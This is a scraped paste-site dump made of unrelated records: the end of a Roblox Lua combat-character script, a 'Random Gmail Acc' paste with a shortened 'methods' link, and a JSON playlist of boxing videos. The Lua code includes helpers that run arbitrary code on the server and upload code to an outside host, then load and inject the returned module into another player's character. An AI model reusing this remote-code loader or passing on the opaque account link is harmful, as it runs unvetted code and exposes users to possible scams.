							local angle = GetTorso(who).Position - Root.Position + Vector3.new(0, 0, 0).unit
							local body = NewInstance('BodyVelocity',GetTorso(who),{
								P = 500,
								maxForce = V3.N(math.huge,0,math.huge),
								velocity = Root.CFrame.lookVector * Knock + Root.Velocity / 1.05
							})
							game:service'Debris':AddItem(body,.5)
						elseif(Type == ""Electric"")then
							if(M.RNG(1,100) >= critChance)then
								if(who:FindFirstChild'Head' and hum.Health > 0)then
									ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), ""[PARALYZED]"", 1.5, BrickColor.new""New Yeller"".Color)
								end
								local asd = hum.WalkSpeed/2
								hum.WalkSpeed = asd
								local paralyzed = true
								coroutine.wrap(function()
									while paralyzed do
										swait(25)
										if(M.RNG(1,25) == 1)then
											if(who:FindFirstChild'Head' and hum.Health > 0)then
												ShowDamage((who.Head.CFrame * CF.N(0, 0, (who.Head.Size.Z / 2)).p+V3.N(0,1.5,0)+V3.N(M.RNG(-2,2),0,M.RNG(-2,2))), ""[STATIC]"", 1.5, BrickColor.new""New Yeller"".Color)
											end
											hum.PlatformStand = true
										end
									end
								end)()
								delay(4, function()
									paralyzed = false
									hum.WalkSpeed = hum.WalkSpeed + asd
								end)
							end
							
						elseif(Type == 'Knockdown' and GetTorso(who))then
							local rek = GetTorso(who)
							hum.PlatformStand = true
							delay(1,function()
								hum.PlatformStand = false
							end)
							local angle = (GetTorso(who).Position - (Root.Position + Vector3.new(0, 0, 0))).unit
							local bodvol = NewInstance(""BodyVelocity"",rek,{
								velocity = angle * Knock,
								P = 5000,
								maxForce = Vector3.new(8e+003, 8e+003, 8e+003),
							})
							local rl = NewInstance(""BodyAngularVelocity"",rek,{
								P = 3000,
								maxTorque = Vector3.new(500000, 500000, 500000) * 50000000000000,
								angularvelocity = Vector3.new(math.random(-10, 10), math.random(-10, 10), math.random(-10, 10)),
							})
							game:GetService(""Debris""):AddItem(bodvol, .5)
							game:GetService(""Debris""):AddItem(rl, .5)
						end
					end
				end
			end
		end
	end
end

function AOEDamage(where,range,minDam,maxDam,Knock,Type,critChance,critMult)
	for _,v in next, getRegion(where,range,{Char}) do
		if(v.Parent and v.Parent:FindFirstChildOfClass'Humanoid')then
			coroutine.wrap(function() for i = 1, M.RNG(minDam,maxDam) do swait() DealDamage(v.Parent,1,1,Knock,Type,0,1) end end)()
		end
	end
end

function AOEHeal(where,range,amount)
	local healed = {}
	for _,v in next, getRegion(where,range,{Char}) do
		local hum = (v.Parent and v.Parent:FindFirstChildOfClass'Humanoid' or nil)
		if(hum and not healed[hum])then
			hum.Health = hum.Health + amount
			if(v.Parent:FindFirstChild'Head' and hum.Health > 0)then
				ShowDamage((v.Parent.Head.CFrame * CF.N(0, 0, (v.Parent.Head.Size.Z / 2)).p+V3.N(0,1.5,0)), ""+""..amount, 1.5, BrickColor.new'Lime green'.Color)
			end
		end
	end
end

function CamShake(who,times,intense,origin) 
	coroutine.wrap(function()
		if(script:FindFirstChild'CamShake')then
			local cam = script.CamShake:Clone()
			cam:WaitForChild'intensity'.Value = intense
			cam:WaitForChild'times'.Value = times
			
	 		if(origin)then NewInstance((typeof(origin) == 'Instance' and ""ObjectValue"" or typeof(origin) == 'Vector3' and 'Vector3Value'),cam,{Name='origin',Value=origin}) end
			cam.Parent = who
			wait()
			cam.Disabled = false
		elseif(who == Plr or who == Char)then
			local intensity = intense
			local cam = workspace.CurrentCamera
			for i = 1, times do
				local camDistFromOrigin
				if(typeof(origin) == 'Instance' and origin:IsA'BasePart')then
					camDistFromOrigin = math.floor( (cam.CFrame.p-origin.Position).magnitude )/25
				elseif(typeof(origin) == 'Vector3')then
					camDistFromOrigin = math.floor( (cam.CFrame.p-origin).magnitude )/25
				end
				if(camDistFromOrigin)then
					intensity = math.min(intense, math.floor(intense/camDistFromOrigin))
				end
				cam.CFrame = cam.CFrame:lerp(cam.CFrame*CFrame.new(math.random(-intensity,intensity)/100,math.random(-intensity,intensity)/100,math.random(-intensity,intensity)/100)*CFrame.Angles(math.rad(math.random(-intensity,intensity)/100),math.rad(math.random(-intensity,intensity)/100),math.rad(math.random(-intensity,intensity)/100)),.4)
				swait()
			end
		end
	end)()
end

function CamShakeAll(times,intense,origin)
	for _,v in next, Plrs:players() do
		CamShake(v:FindFirstChildOfClass'PlayerGui' or v:FindFirstChildOfClass'Backpack' or v.Character,times,intense,origin)
	end
end

function ServerScript(code)
	if(script:FindFirstChild'Loadstring')then
		local load = script.Loadstring:Clone()
		load:WaitForChild'Sauce'.Value = code
		load.Disabled = false
		load.Parent = workspace
	elseif(NS and typeof(NS) == 'function')then
		NS(code,workspace)
	else
		warn(""no serverscripts lol"")
	end	
end

function LocalOnPlayer(who,code)
	ServerScript([[
		wait()
		script.Parent=nil
		if(not _G.Http)then _G.Http = game:service'HttpService' end
		
		local Http = _G.Http or game:service'HttpService'
		
		local source = ]]..""[[""..code..""]]""..[[
		local link = ""https://api.vorth.xyz/R_API/R.UPLOAD/NEW_LOCAL.php""
		local asd = Http:PostAsync(link,source)
		repeat wait() until asd and Http:JSONDecode(asd) and Http:JSONDecode(asd).Result and Http:JSONDecode(asd).Result.Require_ID
		local ID = Http:JSONDecode(asd).Result.Require_ID
		local vs = require(ID).VORTH_SCRIPT
		vs.Parent = game:service'Players'.]]..who.Name..[[.Character
	]])
end


--// Attack Functions \\--
function Laser(key)
	NeutralAnims = false
	Attack = true
	Root.Anchored = true
	local data = MagicCircle{Weld=Torso,Pos=CF.N(0,0,-4),Size=5,Variant=MagicVariant,Time=.5}
	local IsGrown = false
	data.Grown:connect(function() IsGrown = true end)
	repeat swait() 
		local Alpha = .1
		LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(125),0,0),Alpha)
		RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(125),0,0),Alpha)
		RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
		NK.C0 = NK.C0:lerp(NKC0,Alpha)
		LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
		RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
		local LookVector = Mouse.Hit.p
		Torso.CFrame = CF.N(Root.Position,LookVector) 
	until IsGrown
	if(S.UserInputService:IsKeyDown(key))then
		local grown = 0
		repeat 
			local Alpha = .1
			LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(125),0,0),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(125),0,0),Alpha)
			RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
			NK.C0 = NK.C0:lerp(NKC0,Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
			local LookVector = Mouse.Hit.p
			Root.CFrame = CF.N(Root.Position,LookVector)
			if(grown < 250)then
				data.Grow(.05)
				grown = grown + 1
			end
			swait()
		until not S.UserInputService:IsKeyDown(key)
	end
	Sound(data.Circle,340722848,1,1,false,true,true)
	local hit,pos,norm,dist = CastRay(data.Circle.CFrame.p,Mouse.Hit.p,1024)
	local part = Part(Effects,MagicVariant.EffectColor or MagicVariant.Color,Enum.Material.Neon,V3.N(dist,data.Mesh.Scale.x/40,data.Mesh.Scale.x/40),CF.N(data.Circle.CFrame.p,pos)*CF.N(0,0,-dist/2)*CF.A(0,M.P/2,0),true,false)
	Mesh(part,Enum.MeshType.Cylinder)
	Tween(part,{Color=C3.N(1,1,1)},1,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false)
	Effect{
		Effect='ResizeAndFade',
		Color=MagicVariant.Color,
		Size=V3.N(data.Mesh.Scale.X/20,data.Mesh.Scale.X/20,data.Mesh.Scale.X/20),
		Mesh={MeshType=Enum.MeshType.Sphere},
		CFrame=CF.N(pos),
		FXSettings={
			EndSize=V3.N(.05,.05,.05),
			EndIsIncrement=true
		}
	}
	for i = 1, 5 do
		local angles = CF.A(M.RRNG(-180,180),M.RRNG(-180,180),M.RRNG(-180,180))
		Effect{
			Effect='Fade',
			Frames=65,
			Size=V3.N((data.Mesh.Scale.X/20)/2,(data.Mesh.Scale.X/20)/2,data.Mesh.Scale.X/20),
			CFrame=CF.N(CF.N(pos)*angles*CF.N(0,0,-(data.Mesh.Scale.X/20)).p,pos),
			Mesh = {MeshType=Enum.MeshType.Sphere},
			Material=Enum.Material.Neon,
			Color=MagicVariant.Color,
			MoveDirection=CF.N(CF.N(pos)*angles*CF.N(0,0,-50).p,pos).p,
		}	
	end
	AOEDamage(pos,data.Mesh.Scale.X/20,15,45,0,'Normal',10,4)
	coroutine.wrap(function()
		local frame = (1/30)
		for i = 1, 30 do
			part.Transparency = (i/30)
			swait()
		end
		part:destroy()
	end)()
	Attack = false
	NeutralAnims = true
	Root.Anchored = false
	data.Destroy()
end

function Balls(key)
	NeutralAnims = false
	Attack = true
	Root.Anchored = true
	local data = MagicCircle{Weld=Torso,Pos=CF.N(0,0,-1),Size=5,Variant=MagicVariant,Time=.5}
	local IsGrown = false
	data.Grown:connect(function() IsGrown = true end)
	repeat swait() 
		local Alpha = .1
		local idk = M.R(25)
		LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
		RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
		RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
		NK.C0 = NK.C0:lerp(NKC0,Alpha)
		LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
		RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
		local LookVector = Mouse.Hit.p
		Torso.CFrame = CF.N(Root.Position,LookVector) 
	until IsGrown
	local projectiles = 5
	if(S.UserInputService:IsKeyDown(key))then
		local grown = 0
		repeat 
			local Alpha = .1
			local idk = M.R(25)
			LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
			RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
			NK.C0 = NK.C0:lerp(NKC0,Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
			local LookVector = Mouse.Hit.p
			Root.CFrame = CF.N(Root.Position,LookVector)
			if(grown < 250)then
				data.Grow(.05)
				grown = grown + 1
				projectiles = projectiles + .05
			end
			swait()
		until not S.UserInputService:IsKeyDown(key)
	end
	for i = 1, math.floor(projectiles) do
		data.Grow(-math.floor(projectiles)/20)
		local LookVector = Mouse.Hit.p
		Root.CFrame = CF.N(Root.Position,LookVector)
		ShootBullet{Shape='Ball',Frames=160,Origin=data.Circle.CFrame,Speed=10}
		swait(1)
	end
	
	Attack = false
	NeutralAnims = true
	Root.Anchored = false
	data.Destroy()
end

function DLaser(key)
	NeutralAnims = false
	Attack = true
	Root.Anchored = true
	local data1 = MagicCircle{Weld=Torso,Pos=CF.N(-4,0,-4),Size=5,Variant=MagicVariant,Time=.5}
	local data2 = MagicCircle{Weld=Torso,Pos=CF.N(4,0,-4),Size=5,Variant=MagicVariant,Time=.5}
	local IsGrown = false
	data1.Grown:connect(function() IsGrown = true end)
	repeat swait() 
		local Alpha = .1
		local idk = M.R(25)
		LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
		RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
		RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
		NK.C0 = NK.C0:lerp(NKC0,Alpha)
		LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
		RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
		local LookVector = Mouse.Hit.p
		Torso.CFrame = CF.N(Root.Position,LookVector) 
	until IsGrown
	if(S.UserInputService:IsKeyDown(key))then
		local grown = 0
		repeat 
			local Alpha = .1
			local idk = M.R(25)
			LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
			RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
			NK.C0 = NK.C0:lerp(NKC0,Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
			local LookVector = Mouse.Hit.p
			Root.CFrame = CF.N(Root.Position,LookVector)
			if(grown < 250)then
				data1.Grow(.05)
				data2.Grow(.05)
				grown = grown + 1
			end
			swait()
		until not S.UserInputService:IsKeyDown(key)
	end
	Sound(data1.Circle,340722848,1,1,false,true,true)
	Sound(data2.Circle,340722848,1,1,false,true,true)
	local hit,pos,norm,dist = CastRay(data1.Circle.CFrame.p,Mouse.Hit.p,1024)
	local part1 = Part(Effects,MagicVariant.EffectColor or MagicVariant.Color,Enum.Material.Neon,V3.N(dist,data1.Mesh.Scale.x/40,data1.Mesh.Scale.x/40),CF.N(data1.Circle.CFrame.p,pos)*CF.N(0,0,-dist/2)*CF.A(0,M.P/2,0),true,false)
	Mesh(part1,Enum.MeshType.Cylinder)
	
	
	local part2 = Part(Effects,MagicVariant.EffectColor or MagicVariant.Color,Enum.Material.Neon,V3.N(dist,data2.Mesh.Scale.x/40,data2.Mesh.Scale.x/40),CF.N(data2.Circle.CFrame.p,pos)*CF.N(0,0,-dist/2)*CF.A(0,M.P/2,0),true,false)
	Mesh(part2,Enum.MeshType.Cylinder)
	Tween(part1,{Color=C3.N(1,1,1)},1,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false)
	Tween(part2,{Color=C3.N(1,1,1)},1,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false)
	Effect{
		Effect='ResizeAndFade',
		Color=MagicVariant.Color,
		Size=V3.N(data1.Mesh.Scale.X/20,data1.Mesh.Scale.X/20,data1.Mesh.Scale.X/20),
		Mesh={MeshType=Enum.MeshType.Sphere},
		CFrame=CF.N(pos),
		FXSettings={
			EndSize=V3.N(.05,.05,.05),
			EndIsIncrement=true
		}
	}
	for i = 1, 5 do
		local angles = CF.A(M.RRNG(-180,180),M.RRNG(-180,180),M.RRNG(-180,180))
		Effect{
			Effect='Fade',
			Frames=65,
			Size=V3.N((data1.Mesh.Scale.X/20)/2,(data1.Mesh.Scale.X/20)/2,data1.Mesh.Scale.X/20),
			CFrame=CF.N(CF.N(pos)*angles*CF.N(0,0,-(data1.Mesh.Scale.X/20)).p,pos),
			Mesh = {MeshType=Enum.MeshType.Sphere},
			Material=Enum.Material.Neon,
			Color=MagicVariant.Color,
			MoveDirection=CF.N(CF.N(pos)*angles*CF.N(0,0,-50).p,pos).p,
		}	
	end
	AOEDamage(pos,data1.Mesh.Scale.X/20,15,45,0,'Normal',10,4)
	AOEDamage(pos,data2.Mesh.Scale.X/20,15,45,0,'Normal',10,4)
	coroutine.wrap(function()
		local frame = (1/30)
		for i = 1, 30 do
			part1.Transparency = (i/30)
			part2.Transparency = (i/30)
			swait()
		end
		part1:destroy()
		part2:destroy()
	end)()
	Attack = false
	NeutralAnims = true
	Root.Anchored = false
	data1.Destroy()
	data2.Destroy()
end


function BLaser(key)
	NeutralAnims = false
	Attack = true
	Root.Anchored = true
	local data = MagicCircle{Weld=Torso,Pos=CF.N(0,0,-1),Size=15,Variant=MagicVariant,Time=.75}
	local IsGrown = false
	data.Grown:connect(function() IsGrown = true end)
	repeat swait() 
		local Alpha = .1
		local idk = M.R(25)
		LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
		RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
		RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
		NK.C0 = NK.C0:lerp(NKC0,Alpha)
		LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
		RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
		local LookVector = Mouse.Hit.p
		Torso.CFrame = CF.N(Root.Position,LookVector) 
	until IsGrown
	if(S.UserInputService:IsKeyDown(key))then
		local grown = 0
		repeat 
			local Alpha = .1
			local idk = M.R(25)
			LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
			RJ.C0 = RJ.C0:lerp(RJC0,Alpha)
			NK.C0 = NK.C0:lerp(NKC0,Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
			local LookVector = Mouse.Hit.p
			Root.CFrame = CF.N(Root.Position,LookVector)
			swait()
		until not S.UserInputService:IsKeyDown(key)
	end
	
	local hit,pos,norm,dist = CastRay(data.Circle.CFrame.p,Mouse.Hit.p,1024)
	local part = Part(Effects,MagicVariant.EffectColor or MagicVariant.Color,Enum.Material.Neon,V3.N(dist,data.Mesh.Scale.x/40,data.Mesh.Scale.x/40),CF.N(data.Circle.CFrame.p,pos)*CF.N(0,0,-dist/2)*CF.A(0,M.P/2,0),true,false)
	Mesh(part,Enum.MeshType.Cylinder)
	Tween(part,{Color=C3.N(1,1,1)},1,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false)
	local aa = data.Circle:Clone();
	aa.Parent = Effects
	aa.Anchored = true
	local blast = Sound(aa,334702766,1,5,false,true,true)
	data.Circle:destroy()
	if(not blast.IsLoaded)then repeat swait() until blast.IsLoaded end
	Effect{
		Effect='ResizeAndFade',
		Color=MagicVariant.Color,
		Size=V3.N(data.Mesh.Scale.X/20,data.Mesh.Scale.X/20,data.Mesh.Scale.X/20),
		Mesh={MeshType=Enum.MeshType.Sphere},
		CFrame=CF.N(pos),
		Sound=blast,
		FXSettings={
			EndSize=V3.N(.05,.05,.05),
			EndIsIncrement=true
		}
	}
	for i = 1, 5 do
		local angles = CF.A(M.RRNG(-180,180),M.RRNG(-180,180),M.RRNG(-180,180))
		Effect{
			Effect='Fade',
			Frames=65,
			Sound=blast,
			Size=V3.N((data.Mesh.Scale.X/20)/2,(data.Mesh.Scale.X/20)/2,data.Mesh.Scale.X/20),
			CFrame=CF.N(CF.N(pos)*angles*CF.N(0,0,-(data.Mesh.Scale.X/20)).p,pos),
			Mesh = {MeshType=Enum.MeshType.Sphere},
			Material=Enum.Material.Neon,
			Color=MagicVariant.Color,
			MoveDirection=CF.N(CF.N(pos)*angles*CF.N(0,0,-50).p,pos).p,
		}	
	end
	AOEDamage(pos,data.Mesh.Scale.X/20,45,75,0,'Normal',10,4)
	coroutine.wrap(function()
		for i = 1, (blast.TimeLength*Frame_Speed) do
			part.Transparency = (i/(blast.TimeLength*Frame_Speed))
			for _,v in next, aa:children() do if v:IsA'Decal' then v.Transparency = (i/(blast.TimeLength*Frame_Speed)) end end
			swait()
		end
		aa:destroy()
		part:destroy()
	end)()
	
	Attack = false
	NeutralAnims = true
	Root.Anchored = false
	Root.Velocity = Mouse.Hit.lookVector*-125
end

function Skill1()
	Laser(Enum.KeyCode.Q)
end

function Skill2()
	DLaser(Enum.KeyCode.Z)
end

function Skill3()
	BLaser(Enum.KeyCode.X)
end

--// Wrap it all up \\--

Mouse.KeyDown:connect(function(k)
	if(Attack)then return end
	if(k == 'q')then Skill1() end
	if(k == 'z')then Skill2() end
	if(k == 'x')then Skill3() end
end)

Plr.Chatted:connect(function(m)
	
	if(m:sub(1,3) == '/e ')then
		local msg = m:sub(4)
		--emote commands (gotta do)
	end
end)
while true do
	swait()
	Sine = Sine + Change

	local hitfloor,posfloor = workspace:FindPartOnRay(Ray.new(Root.CFrame.p,((CFrame.new(Root.Position,Root.Position - Vector3.new(0,1,0))).lookVector).unit * (4)), Char)
	
	local Walking = (math.abs(Root.Velocity.x) > 1 or math.abs(Root.Velocity.z) > 1)
	local State = (Hum.PlatformStand and 'Paralyzed' or Hum.Sit and 'Sit' or not hitfloor and Root.Velocity.y < -1 and ""Fall"" or not hitfloor and Root.Velocity.y > 1 and ""Jump"" or hitfloor and Walking and (Hum.WalkSpeed > 24 and ""Run"" or ""Walk"") or hitfloor and ""Idle"")
	if(not Effects or not Effects.Parent)then
		Effects = IN(""Model"",Char)
		Effects.Name = ""Effects""
	end																																																																																																				
	if(State == 'Run')then
		local wsVal = 20 / (Hum.WalkSpeed/16)
		local Alpha = math.min(.2 * (Hum.WalkSpeed/16),1)
		Change = 3
		RH.C1 = RH.C1:lerp(CF.N(0,1,0)*CF.N(0,0-.2*M.C(Sine/wsVal),0+.4*M.C(Sine/wsVal))*CF.A(M.R(15+25*M.C(Sine/wsVal))+-M.S(Sine/wsVal),0,0),Alpha)
		LH.C1 = LH.C1:lerp(CF.N(0,1,0)*CF.N(0,0+.2*M.C(Sine/wsVal),0-.4*M.C(Sine/wsVal))*CF.A(M.R(15-25*M.C(Sine/wsVal))+M.S(Sine/wsVal),0,0),Alpha)	
	elseif(State == 'Walk')then
		local wsVal = 20 / (Hum.WalkSpeed/16)
		local Alpha = math.min(.3 * (Hum.WalkSpeed/8),1)
		Change = 3
		RH.C1 = RH.C1:lerp(CF.N(0,1,0)*CF.N(0,0-.5*M.C(Sine/wsVal)/2,0+.6*M.C(Sine/wsVal)/2)*CF.A(M.R(15-2*M.C(Sine/wsVal))+-M.S(Sine/wsVal)/2.5,0,0),Alpha)
		LH.C1 = LH.C1:lerp(CF.N(0,1,0)*CF.N(0,0+.5*M.C(Sine/wsVal)/2,0-.6*M.C(Sine/wsVal)/2)*CF.A(M.R(15+2*M.C(Sine/wsVal))+M.S(Sine/wsVal)/2.5,0,0),Alpha)	
	else
		RH.C1 = RH.C1:lerp(CF.N(0,1,0),.2)
		LH.C1 = LH.C1:lerp(CF.N(0,1,0),.2)
	end	

	Hum.WalkSpeed = WalkSpeed
	
	if(NeutralAnims)then	
		if(State == 'Idle')then
			local Alpha = .1
			Change = .75
			RJ.C0 = RJ.C0:lerp(RJC0*CF.N(0+.2*M.C(Sine/12),.2*M.C(Sine/6),0)*CF.A(M.R(-5+5*M.C(Sine/12)),0,0),Alpha)
			NK.C0 = NK.C0:lerp(NKC0*CF.A(M.R(-5+5*M.C(Sine/12)),0,0),Alpha)
			LS.C0 = LS.C0:lerp(LSC0*CF.N(.25,0,0)*CF.A(M.R(-45),0,M.R(45+5*M.C(Sine/12))),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.N(-.25,0,0)*CF.A(M.R(-45),0,M.R(-45-5*M.C(Sine/12))),Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.N(0-.2*M.C(Sine/12),-.2*M.C(Sine/6),0)*CF.A(M.R(5-5*M.C(Sine/12)),M.R(10),0),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0-.2*M.C(Sine/12),-.2*M.C(Sine/6),0)*CF.A(M.R(5-5*M.C(Sine/12)),M.R(-10),0),Alpha)
			-- idle
		elseif(State == 'Run')then
			local wsVal = 20 / (Hum.WalkSpeed/16)
			local Alpha = math.min(.2 * (Hum.WalkSpeed/16),1)
			RJ.C0 = RJ.C0:lerp(CF.N(0,0-.1*M.C(Sine/(wsVal/2)),0)*CF.A(M.R(-15+2.5*M.C(Sine/(wsVal/2))),M.R(8*M.C(Sine/wsVal)),0),Alpha)
			NK.C0 = NK.C0:lerp(NKC0,Alpha)
			LS.C0 = LS.C0:lerp(LSC0*CF.N(0,0,0-.3*M.S(Sine/wsVal))*CF.A(M.R(0+45*M.S(Sine/wsVal)),0,M.R(-5)),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.N(0,0,0+.3*M.S(Sine/wsVal))*CF.A(M.R(0-45*M.S(Sine/wsVal)),0,M.R(5)),Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.N(0,0+.1*M.C(Sine/(wsVal/2)),0)*CF.A(0,-M.R(4*M.C(Sine/wsVal)),0),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,0+.1*M.C(Sine/(wsVal/2)),0)*CF.A(0,-M.R(4*M.C(Sine/wsVal)),0),Alpha)
		elseif(State == 'Walk')then
			local wsVal = 20 / (Hum.WalkSpeed/16)
			local Alpha = math.min(.3 * (Hum.WalkSpeed/16),1)
			RJ.C0 = RJ.C0:lerp(CF.N(0,0-.1*M.C(Sine/(wsVal/2)),0)*CF.A(M.R(-5-2.5*M.C(Sine/(wsVal/2))),M.R(8*M.C(Sine/wsVal)),0),Alpha)
			NK.C0 = NK.C0:lerp(NKC0,Alpha)
			LS.C0 = LS.C0:lerp(LSC0*CF.N(0,0,-.22*M.C(Sine/wsVal))*CF.A(M.R(37*M.C(Sine/wsVal)),0,M.R(-5)),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.N(0,0,.22*M.C(Sine/wsVal))*CF.A(M.R(-37*M.C(Sine/wsVal)),0,M.R(5)),Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.N(0,0+.1*M.C(Sine/(wsVal/2)),0)*CF.A(0,-M.R(4*M.C(Sine/wsVal)),0),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,0+.1*M.C(Sine/(wsVal/2)),0)*CF.A(0,-M.R(4*M.C(Sine/wsVal)),0),Alpha)
		elseif(State == 'Jump')then
			local Alpha = .1
			local idk = math.min(math.max(Root.Velocity.Y/50,-M.R(90)),M.R(90))
			LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)),Alpha)
			RJ.C0 = RJ.C0:lerp(RJC0*CF.A(math.min(math.max(Root.Velocity.Y/100,-M.R(45)),M.R(45)),0,0),Alpha)
			NK.C0 = NK.C0:lerp(NKC0*CF.A(math.min(math.max(Root.Velocity.Y/100,-M.R(45)),M.R(45)),0,0),Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
		elseif(State == 'Fall')then
			local Alpha = .1
			local idk = math.min(math.max(Root.Velocity.Y/50,-M.R(90)),M.R(90))
			LS.C0 = LS.C0:lerp(LSC0*CF.A(M.R(-5),0,M.R(-90)+idk),Alpha)
			RS.C0 = RS.C0:lerp(RSC0*CF.A(M.R(-5),0,M.R(90)-idk),Alpha)
			RJ.C0 = RJ.C0:lerp(RJC0*CF.A(math.min(math.max(Root.Velocity.Y/100,-M.R(45)),M.R(45)),0,0),Alpha)
			NK.C0 = NK.C0:lerp(NKC0*CF.A(math.min(math.max(Root.Velocity.Y/100,-M.R(45)),M.R(45)),0,0),Alpha)
			LH.C0 = LH.C0:lerp(LHC0*CF.A(0,0,M.R(-5)),Alpha)
			RH.C0 = RH.C0:lerp(RHC0*CF.N(0,1,-1)*CF.A(M.R(-5),0,M.R(5)),Alpha)
		elseif(State == 'Paralyzed')then
			-- paralyzed
		elseif(State == 'Sit')then
			-- sit
		end
	end
	
end"
dMdy4HjA,Random Gmail Acc 1A,andkahui,JavaScript,Friday 28th of March 2025 06:32:11 PM CDT," 
Pdf https://tinyurl.com/methodssss


MsGKgzCskC
"
aj9hRrAF,Untitled,jaguenk,JSON,Friday 28th of March 2025 06:20:30 PM CDT,"{
""name"": ""DiFeriDos ReMenBer BoXing"",
""author"": ""🅰️🅵1🅲🅸🅾️🅽🅰️🅳🅾️🆂"",
""url"": ""https://pastebin.com/raw/aj9hRrAF"",
""image"": ""https://i.gifer.com/J4L.gif"",
""telegram"": ""@Tintxi"",
""info"": ""by Tintxi"",
""stations"":
	[
 
	{
	""name"": ""Ali 🆚 Mildenberger"",
	""image"": ""https://i.postimg.cc/j2pRQFZv/IMG-20240126-131836-632.jpg"",
	""url"": ""https://filemoon.to/d/75s14ytthmny"",
	""info"": ""10-09-1966"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"":""true"",
	""online"":""true""
	},
	{ 
	""name"": ""Mosley 🆚 Cotto"", 
	""image"": ""https://i.postimg.cc/mDgnbQ3y/IMG-20240127-030005.jpg"", 
	""url"": ""https://filemoon.to/d/3da3r8oh8i7c"", 
	""info"": ""11-11-2007"", 
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"", 
	""online"": ""true"" 
	},
	{ 
	""name"": ""Hagler 🆚 Duran"",
	""image"": ""https://i.postimg.cc/hv9ZspKg/IMG-20240127-030014.jpg"",
	""url"": ""https://filemoon.to/d/qlytfygy17lk"",
	""info"": ""10-11-1983"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
	{ 
	""name"": ""Pacquiao 🆚 Bradley"",
